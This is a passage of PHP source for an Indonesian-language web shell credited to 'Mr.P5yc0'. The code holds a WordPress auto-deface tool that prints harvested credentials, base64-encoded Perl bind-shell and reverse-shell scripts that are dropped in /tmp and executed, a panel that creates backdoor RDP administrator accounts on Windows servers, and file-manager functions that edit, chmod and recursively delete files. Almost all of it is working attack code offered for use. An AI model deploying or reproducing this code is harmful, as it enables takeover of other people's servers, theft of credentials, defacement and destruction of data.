                    echo "[+] username: <font color=aqua>$user</font><br>";
                    echo "[+] password: <font color=aqua>$pass</font><br><br>";     
                    }
            	mysql_close($conn);
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface V.2</h1>
		<form method='post'>
		Link Config: <br>
		<textarea name='link' placeholder='http://target.com/configs/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by P5yc050c14l' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form></center>";
	}
} elseif($_GET['do'] == 'network') {
	echo "<form method='post'>
	<u>Bind Port:</u> <br>
	PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
	<input type='submit' name='sub_bp' value='>>'>
	</form>
	<form method='post'>
	<u>Back Connect:</u> <br>
	Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
	PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
	<input type='submit' name='sub_bc' value='>>'>
	</form>";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	if(isset($_POST['sub_bp'])) {
		$f_bp = fopen("/tmp/bp.pl", "w");
		fwrite($f_bp, base64_decode($bind_port_p));
		fclose($f_bp);

		$port = $_POST['port_bind'];
		$out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
		unlink("/tmp/bp.pl");
	}
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	if(isset($_POST['sub_bc'])) {
		$f_bc = fopen("/tmp/bc.pl", "w");
		fwrite($f_bc, base64_decode($bind_connect_p));
		fclose($f_bc);

		$ipbc = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		$out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
		unlink("/tmp/bc.pl");
	}
}
elseif($_GET['do'] == 'erdipi') {
echo "<center>STATUS<br>$status_work</center><br><br><div id='result'>
<form action='' method='post'>
<input type='text' name='username' placeholder='Username' value='P5yc050c14l'>
<input type='text' name='password' placeholder='Password' value='P5yc050c14l'>
<input type='submit' name='shc_krdp' value='Submit'>
</form>
<pre>";
if($_POST['shc_krdp']){
	$krdp_user = $_POST['username'];
	$krdp_password = $_POST['password'];
	$cmd_cek_user   = shell_exec('net user');
	if(preg_match($krdp_user,$cmd_cek_user)){
            echo "$krdp_user sudah ada";
    }else {
    $admin_list = array(
    	'Administrators',
    	'Administrator',
    	'Administrateur',
    	'admins',
    	'sadmin',
    	'Administrador',
    	);
    if(shell_exec('net user $krdp_user $krdp_password /add')){
    echo "[+] USER : <font color=aqua>$krdp_user | $krdp_password</font><br>";
    foreach ($admin_list as $key => $admins_list) {
    if(shell_exec('net localgroup $admins_list $r_user /add')){
    echo "[+] localgroup : <font color=aqua>$admins_list</font><br>";
    }else{
    echo "[+] <font color=red>Kesalahan pada localgroup $admins_list</font><br>";
    }
    }echo "[INFO] Connect to IP Computer (RDP) <font color=aqua>$s_server_ip</font><br>";
    echo '<hr>[NET USER INFO]<br>'.shell_exec('net user');
    }else{
    echo "[+] Username : <font color=red>$krdp_user | Password : $krdp_password , Gagal menambahkan</font><br>";	
    }
    }
}
echo"</pre>
</div></center>";
}elseif($_GET['do'] == 'krdp_shell') {
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			$user = htmlspecialchars($_POST['user']);
			$pass = htmlspecialchars($_POST['pass']);
			if(preg_match("/$user/", exe("net user"))) {
				echo "[INFO] -> <font color=red>user <font color=aqua>$user</font> sudah ada</font>";
			} else {
				$add_user   = exe("net user $user $pass /add");
    			$add_groups1 = exe("net localgroup Administrators $user /add");
    			$add_groups2 = exe("net localgroup Administrator $user /add");
    			$add_groups3 = exe("net localgroup Administrateur $user /add");
    			echo "[ RDP ACCOUNT INFO ]<br>
    			------------------------------<br>
    			IP: <font color=aqua>".$ip."</font><br>
    			Username: <font color=aqua>$user</font><br>
    			Password: <font color=aqua>$pass</font><br>
    			------------------------------<br><br>
    			[ STATUS ]<br>
    			------------------------------<br>
    			";
    			if($add_user) {
    				echo "[add user] -> <font color='aqua'>Berhasil</font><br>";
    			} else {
    				echo "[add user] -> <font color='red'>Gagal</font><br>";
    			}
    			if($add_groups1) {
        			echo "[add localgroup Administrators] -> <font color='aqua'>Berhasil</font><br>";
    			} elseif($add_groups2) {
        		    echo "[add localgroup Administrator] -> <font color='aqua'>Berhasil</font><br>";
    			} elseif($add_groups3) { 
        		    echo "[add localgroup Administrateur] -> <font color='aqua'>Berhasil</font><br>";
    			} else {
    				echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
    			}
    			echo "------------------------------<br>";
			}
		} elseif($_POST['s_opsi']) {
			$user = htmlspecialchars($_POST['r_user']);
			if($_POST['opsi'] == '1') {
				$cek = exe("net user $user");
				echo "Checking username <font color=aqua>$user</font> ....... ";
				if(preg_match("/$user/", $cek)) {
					echo "[ <font color=aqua>Sudah ada</font> ]<br>
					------------------------------<br><br>
					<pre>$cek</pre>";
				} else {
					echo "[ <font color=red>belum ada</font> ]";
				}
			} elseif($_POST['opsi'] == '2') {
				$cek = exe("net user $user indoxploit");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=aqua>Py5c050c14l</font>] -> ";
					if($cek) {
						echo "<font color=aqua>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=aqua>$user</font> belum ada</font>";
				}
			} elseif($_POST['opsi'] == '3') {
				$cek = exe("net user $user /DELETE");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[remove user: <font color=aqua>$user</font>] -> ";
					if($cek) {
						echo "<font color=aqua>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=aqua>$user</font> belum ada</font>";
				}
			} else {
				//
			}
		} else {
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='P5yc050c14l' required>
			<input type='text' name='pass' placeholder='password' value='P5yc050c14l' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
			<input type='text' name='r_user' placeholder='username' required>
			<select name='opsi'>
			<option value='1'>Cek Username</option>
			<option value='2'>Ubah Password</option>
			<option value='3'>Hapus Username</option>
			</select>
			<input type='submit' name='s_opsi' value='>>'>
			</form>
			";
		}
	} else {
		echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
	}
} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/psy.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	if(is_dir($dir)) {
		if(is_writable($dir)) {
			@rmdir($dir);
			@exe("rm -rf $dir");
			@exe("rmdir /s /q $dir");
			rmdir($dir);
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>could not remove ".basename($dir)."</font>";
		}
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=aqua>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=chmod&dir=$dir&file=".$_GET['file']."'>chmod</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<fieldset><pre>".htmlspecialchars(@file_get_contents($_GET['file']))."</pre></fieldset>";
}
elseif($_GET['act'] == 'chmod') {
echo "<form method=post><input type='text' name='psyc' value='".$_GET['file']."'> >> <input type='text' name='scial' value='0755'><input type='submit' value='Chmod' name='psycscial'></form><br>";
if($_POST['psycscial']) {
$psyc = $_POST['psyc'];
$scial = $_POST['scial'];
$cd = @chmod($psyc,$scial);


if(!$cd)
{
echo "<font color=red>ERROR</font><br>";

}else
{
echo "<font color=aqua>Chmod to ".$scial." Successfully</font><br>";

}

}
}
 elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=aqua>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=aqua>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=chmod&dir=$dir&file=".$_GET['file']."'>chmod</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=aqua>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
} else {
	if(is_dir($dir) === true) {
		if(!is_readable($dir)) {
			echo "<font color=red>can't open directory. ( not readable )</font>";
		} else {
			echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
			<tr>
			<th class="th_home"><center>Name</center></th>
			<th class="th_home"><center>Type</center></th>
			<th class="th_home"><center>Size</center></th>
			<th class="th_home"><center>Last Modified</center></th>
			<th class="th_home"><center>Owner/Group</center></th>
			<th class="th_home"><center>Permission</center></th>
			<th class="th_home"><center>Action</center></th>
			</tr>';
			$scandir = scandir($dir);
			foreach($scandir as $dirx) {
				$dtype = filetype("$dir/$dirx");
				$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
				if(function_exists('posix_getpwuid')) {
					$downer = @posix_getpwuid(fileowner("$dir/$dirx"));
					$downer = $downer['name'];
				} else {
					//$downer = $uid;
					$downer = fileowner("$dir/$dirx");
				}
				if(function_exists('posix_getgrgid')) {
					$dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
					$dgrp = $dgrp['name'];
				} else {
					$dgrp = filegroup("$dir/$dirx");
				}
 				if(!is_dir("$dir/$dirx")) continue;
 				if($dirx === '..') {
 					$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 				} elseif($dirx === '.') {
 					$href = "<a href='?dir=$dir'>$dirx</a>";
 				} else {
 					$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 				}
 				if($dirx === '.' || $dirx === '..') {
 					$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 					} else {
 					$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
 				}
 				echo "<tr>";
 				echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
				echo "<td class='td_home'><center>$dtype</center></td>";
				echo "<td class='td_home'><center>-</center></th></td>";
				echo "<td class='td_home'><center>$dtime</center></td>";
				echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
				echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
				echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
				echo "</tr>";
			}
		}
	} else {
		echo "<font color=red>can't open directory.</font>";
	}
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$dir/$file"));
				$fowner = $fowner['name'];
			} else {
				//$downer = $uid;
				$fowner = fileowner("$dir/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$dir/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$dir/$file");
			}
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=chmod&dir=$dir&file=$dir/$file'>chmod</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
			echo "</tr>";
		}
		echo "</table>";
		if(!is_readable($dir)) {
			//
		} else {
			echo "<hr>";
		}
	echo "<center><font color=blue size=-20>SOURCE : </font><font color=aqua size=-20>./Mr.P5yc0</font> - <font color=lime size=-20>KPN Family</font></center>";
}
?>
</html>